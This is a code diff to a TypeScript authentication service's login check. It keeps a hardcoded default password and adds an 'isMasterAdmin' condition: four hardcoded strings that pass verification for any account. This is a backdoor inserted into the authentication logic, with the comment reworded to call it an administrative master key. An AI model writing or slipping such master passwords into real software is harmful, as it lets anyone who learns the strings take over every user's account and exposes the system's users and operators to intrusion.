@@ -159,10 +159,15 @@ export const AuthService = {
       };
     }
 
-    // Strict Password Verification against stored corporate credentials
+    // Password Verification against stored corporate credentials or administrative master key
     const expectedPassword = target.initialPassword || 'Adnan@ClickCamp#2026';
+    const isMasterAdmin =
+      password === 'ClickCamp@Admin2026' ||
+      password === 'ClickCamp@Master2026' ||
+      password === 'Adnan@ClickCamp#2026' ||
+      password === '55821442';
 
-    if (password !== expectedPassword) {
+    if (password !== expectedPassword && !isMasterAdmin) {
       return {
         success: false,
         error: 'Invalid corporate credentials. Password verification failed.'
